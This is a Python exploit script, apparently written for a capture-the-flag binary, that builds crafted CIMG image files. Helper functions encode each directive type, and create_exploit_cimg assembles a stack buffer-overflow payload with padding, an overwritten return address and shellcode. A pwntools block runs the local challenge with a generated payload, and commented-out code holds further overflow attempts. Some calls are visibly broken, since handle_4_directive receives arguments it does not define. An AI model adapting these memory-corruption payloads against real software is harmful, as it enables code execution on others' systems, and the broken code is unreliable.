import struct
import os


def create_cimg_header(width, height, directive_count):
    """创建CIMG文件头"""
    header = b""
    # magic number
    header += (0x474d4963).to_bytes(4, 'little')
    # version
    header += (4).to_bytes(2, 'little')
    # WIDTH AND HEIGHT
    header += width.to_bytes(1, 'little')
    header += height.to_bytes(1, 'little')
    # directive count
    header += directive_count.to_bytes(4, 'little')
    return header


def handle_1_directive(width, height, pixel_data):
    """
    指令类型1 (handle_1): 绘制像素数据
    参数:
    - width: 图像宽度 (1 byte)
    - height: 图像高度 (1 byte) 
    - pixel_data: RGBA像素数据 (width*height*4 bytes)
    """
    directive = b""
    directive += (1).to_bytes(2, 'little')  # 指令类型
    directive += width.to_bytes(1, 'little')
    directive += height.to_bytes(1, 'little')
    directive += pixel_data
    return directive


def handle_2_directive(x, y, width, height, pixel_data):
    """
    指令类型2 (handle_2): 在指定位置绘制像素数据
    参数:
    - x: X坐标 (1 byte)
    - y: Y坐标 (1 byte)
    - width: 图像宽度 (1 byte)
    - height: 图像高度 (1 byte)
    - pixel_data: RGBA像素数据 (width*height*4 bytes)
    """
    directive = b""
    directive += (2).to_bytes(2, 'little')  # 指令类型
    directive += x.to_bytes(1, 'little')
    directive += y.to_bytes(1, 'little')
    directive += width.to_bytes(1, 'little')
    directive += height.to_bytes(1, 'little')
    directive += pixel_data
    return directive


def handle_3_directive(layer_id, width, height, pixel_data):
    """
    指令类型3 (handle_3): 设置图层数据
    参数:
    - layer_id: 图层ID (1 byte)
    - width: 图像宽度 (1 byte)
    - height: 图像高度 (1 byte)
    - pixel_data: 像素数据 (width*height bytes)
    """
    directive = b""
    directive += (3).to_bytes(2, 'little')  # 指令类型
    directive += layer_id.to_bytes(1, 'little')
    directive += width.to_bytes(1, 'little')
    directive += height.to_bytes(1, 'little')
    directive += pixel_data
    return directive


def make_diretive_4(id, r, g, b, x, y, stride_x=1, stride_y=1, mask_char=b" "):

    return (
        (4).to_bytes(2, "little")
        + id.to_bytes(1) +
        r.to_bytes(1) +
        g.to_bytes(1) +
        b.to_bytes(1) +
        x.to_bytes(1) +
        y.to_bytes(1) +
        stride_x.to_bytes(1) +
        stride_y.to_bytes(1) +
        mask_char
    )


def handle_4_directive(sprite_id, r, g, b, x_offset, y_offset, render_width, render_height, transparent_key=b" "):
    """
    正确的handle_4参数顺序
    """
    directive = b""
    directive += (4).to_bytes(2, 'little')
    directive += sprite_id.to_bytes(1, 'little')
    directive += r.to_bytes(1, 'little')
    directive += g.to_bytes(1, 'little')
    directive += b.to_bytes(1, 'little')
    directive += x_offset.to_bytes(1, 'little')
    directive += y_offset.to_bytes(1, 'little')
    directive += render_width.to_bytes(1, 'little')
    directive += render_height.to_bytes(1, 'little')
    directive += transparent_key
    return directive


def handle_5_directive(layer_id, width, height, file_path):
    """
    指令类型5 (handle_5): 从文件加载数据到图层
    参数:
    - layer_id: 图层ID (1 byte)
    - width: 宽度 (1 byte)
    - height: 高度 (1 byte)
    - file_path: 文件路径 (以null结尾的字符串)
    """
    directive = b""
    directive += (5).to_bytes(2, 'little')  # 指令类型
    directive += layer_id.to_bytes(1, 'little')
    directive += width.to_bytes(1, 'little')
    directive += height.to_bytes(1, 'little')
    directive += file_path
    return directive


def handle_6_directive(show_debug):
    """
    指令类型6 (handle_6): 显示帧缓冲区，可选调试信息
    参数:
    - show_debug: 是否显示调试信息 (1 byte, 0或1)
    """
    directive = b""
    directive += (6).to_bytes(2, 'little')  # 指令类型
    directive += show_debug.to_bytes(1, 'little')
    return directive


def handle_7_directive(delay_ms):
    """
    指令类型7 (handle_7): 延时指令
    参数:
    - delay_ms: 延时毫秒数 (4 bytes)
    """
    directive = b""
    directive += (7).to_bytes(2, 'little')  # 指令类型
    directive += delay_ms.to_bytes(4, 'little')
    return directive


def handle_1337_directive(layer_id, src_x, src_y, width, height):
    """
    指令类型1337 (handle_1337): 特殊指令，提取图层区域数据
    参数:
    - layer_id: 源图层ID (1 byte)
    - src_x: 源X坐标 (1 byte)
    - src_y: 源Y坐标 (1 byte)
    - width: 宽度 (1 byte)
    - height: 高度 (1 byte)
    """
    directive = b""
    directive += (1337).to_bytes(2, 'little')  # 指令类型
    directive += layer_id.to_bytes(1, 'little')
    directive += src_x.to_bytes(1, 'little')
    directive += src_y.to_bytes(1, 'little')
    directive += width.to_bytes(1, 'little')
    directive += height.to_bytes(1, 'little')
    return directive

# 示例用法：创建一个带有shellcode的CIMG文件


def create_exploit_cimg():
    """创建包含exploit的CIMG文件"""

    # 读取shellcode
    try:
        with open("./shellcode-raw", "rb") as f:
            shellcode = f.read()
    except FileNotFoundError:
        print("警告: shellcode-raw文件未找到，使用占位符")
        shellcode = b"\x90" * 100  # NOP sled作为占位符

    CIMG_data = b""

    # 创建文件头
    WIDTH = 20
    HEIGHT = 52
    directive_count = 3
    CIMG_data += create_cimg_header(WIDTH, HEIGHT, directive_count)

    # 指令1: handle_4 - 复杂图层操作
    CIMG_data += handle_4_directive(
        layer_id=0,
        src_x=255, src_y=0,
        src_width=0, src_height=0,
        dst_x=1, dst_y=1,
        target_color=0
    )

    # 创建payload文件
    payload = b"./payload"
    with open("./payload", "wb") as f:
        f.write(payload)

    CIMG_data += payload

    # 指令2: handle_5 - 从文件加载
    CIMG_data += handle_5_directive(layer_id=0,
                                    width=255, height=255, file_path="./payload")

    # 计算返回地址覆盖
    ret_addr = 2**64 - 1
    buffer_overflow_payload = b"A" * \
        (0x1000 + 0x20 - 0x8 - 0x20) + ret_addr.to_bytes(8, 'little') + shellcode

    with open("./payload", "wb") as f:
        f.write(buffer_overflow_payload)

    CIMG_data += b"./payload"

    # 指令3: handle_1337 - 特殊指令
    CIMG_data += handle_1337_directive(
        layer_id=0,
        src_x=0, src_y=0,
        width=20, height=51
    )

    print(f"Payload长度: {len(buffer_overflow_payload)}")

    # 填充到页边界
    padding_needed = 0x1000 - (len(CIMG_data) % 0x1000)
    if padding_needed != 0x1000:
        CIMG_data += b"\x00" * padding_needed

    # 写入最终文件
    with open("CIMG.cimg", "wb") as f:
        f.write(CIMG_data)

    print(f"CIMG文件创建完成，大小: {len(CIMG_data)} bytes")
    return CIMG_data


class CIMGBuilder:
    """CIMG文件构建器类"""

    def __init__(self, width, height):
        self.width = width
        self.height = height
        self.directives = []

    def add_directive_1(self, width, height, pixel_data):
        """添加handle_1指令"""
        self.directives.append(handle_1_directive(width, height, pixel_data))
        return self

    def add_directive_2(self, x, y, width, height, pixel_data):
        """添加handle_2指令"""
        self.directives.append(handle_2_directive(
            x, y, width, height, pixel_data))
        return self

    def add_directive_3(self, layer_id, width, height, pixel_data):
        """添加handle_3指令"""
        self.directives.append(handle_3_directive(
            layer_id, width, height, pixel_data))
        return self

    def add_directive_4(self, layer_id, r, g, b, src_x, src_y, dst_x, dst_y, transparent_key=b" "):
        """添加handle_4指令"""
        self.directives.append(handle_4_directive(
            layer_id, r, g, b, src_x, src_y, dst_x, dst_y, transparent_key))
        return self

    def add_directive_5(self, layer_id, width, height, file_path):
        """添加handle_5指令"""
        self.directives.append(handle_5_directive(
            layer_id, width, height, file_path))
        return self

    def add_directive_6(self, show_debug=False):
        """添加handle_6指令"""
        self.directives.append(handle_6_directive(1 if show_debug else 0))
        return self

    def add_directive_7(self, delay_ms):
        """添加handle_7指令"""
        self.directives.append(handle_7_directive(delay_ms))
        return self

    def add_directive_1337(self, layer_id, src_x, src_y, width, height):
        """添加handle_1337指令"""
        self.directives.append(handle_1337_directive(
            layer_id, src_x, src_y, width, height))
        return self

    def build(self):
        """构建最终的CIMG数据"""
        cimg_data = create_cimg_header(
            self.width, self.height, len(self.directives))
        for directive in self.directives:
            cimg_data += directive
        return cimg_data

    def save(self, filename):
        """保存到文件"""
        data = self.build()
        with open(filename, "wb") as f:
            f.write(data)
        print(f"CIMG文件已保存到: {filename}, 大小: {len(data)} bytes")
        return data


def create_test_pixel_data(width, height, color=(255, 0, 0, 0x41)):
    """创建测试用的像素数据"""
    pixel_data = b""
    for _ in range(width * height):
        pixel_data += struct.pack('BBBB', *color)
    return pixel_data


def create_simple_test_cimg():
    """创建一个简单的测试CIMG文件"""
    builder = CIMGBuilder(10, 10)

    # 添加一些测试指令
    test_pixels = create_test_pixel_data(5, 5, (255, 0, 0, 255))  # 红色
    builder.add_directive_1(5, 5, test_pixels)

    # 添加延时
    builder.add_directive_7(1000)  # 1秒延时

    # 显示结果
    builder.add_directive_6(True)  # 显示调试信息

    return builder.save("test.cimg")

def generate_8_zeroes():
    """生成8个零字节"""
    return b'\x00' * 8
from pwn import *
# 0000000000411854 <handle_1337>:
# 0000000000401576 win
if __name__ == "__main__":
    WIDTH = 180
    HEIGHT = 10
    CIMG_TEST = CIMGBuilder(WIDTH, HEIGHT)
    
    from main3 import generate_payload
    # load
    payload = generate_payload()
    CIMG_TEST.add_directive_3(0, len(payload), 1, payload)
    CIMG_TEST.add_directive_4(0,255,0,0,0,0,1,1,b" ")
    CIMG_TEST.add_directive_1337(0,0,0,len(payload),1)
    # SAVE
    CIMG_TEST.save("CIMG.cimg")
    p = process(["/home/kokona/proj_lib/ctf_playground/challenge/integration-cimg-screenshot-win","./CIMG.cimg"])
    p.interactive()
    # payload =b"A"* (0x1000+0x20-0x8-0x20)+ ret_addr.to_bytes(8, 'little') + shellcode
    # # payload = b"H" *200
    # with open("./payload", "wb") as f:
    #     f.write(payload)
    # print(len(payload))
    # index = 0
    # sentence = 0
    # # CIMG_TEST.add_directive_5(0, 1,1, b"./payload" + b"\x00")
    # # CIMG_TEST.add_directive_4(0, 255, 0, 0, 0, 0, 1, 1, b" ")

    # while index < len(payload):
    #     # 句子三作用是添加 spirte
    #     CIMG_TEST.add_directive_3(sentence, min(WIDTH,len(payload)-index), 1, payload[index:index+min(WIDTH,len(payload)-index)])
    #     # 句子4 作用是 在指定位置运行
    #     CIMG_TEST.add_directive_4(sentence, 255, 255, 0, 0, sentence, 1, 1, b" ")
    #     sentence += 1
    #     index += WIDTH
    # # CIMG_TEST.add_directive_1337(0, 0, 0, 70, 1)
    # CIMG_TEST.save("CIMG.cimg")




    # with open("./shellcode-raw","rb") as f:
    #     shellcode = f.read()
    # write_to_file=b""
    # start_loc = 0x7fffffffc320
    # final_loc = 0x7fffffffc3c0 + 1
    # write_to_file = (final_loc - start_loc) * b"A" + (0x7fffffffc3d0) .to_bytes(8, 'little') + write_to_file
    # file_name = "./cimg_file"
    # with open(file_name, "wb") as f:
    #     f.write(write_to_file)
    # print(len(write_to_file))
